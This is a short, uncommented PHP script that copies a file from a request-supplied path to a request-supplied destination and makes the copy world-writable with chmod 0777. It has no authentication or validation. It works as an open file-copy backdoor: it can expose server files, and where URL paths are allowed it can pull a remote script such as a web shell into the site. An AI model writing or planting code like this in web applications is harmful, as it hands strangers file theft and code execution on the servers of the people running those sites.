<?php
$name = $_REQUEST['name'];
$to = $_REQUEST['to'];
copy($name, $to);
chmod($to, 0777);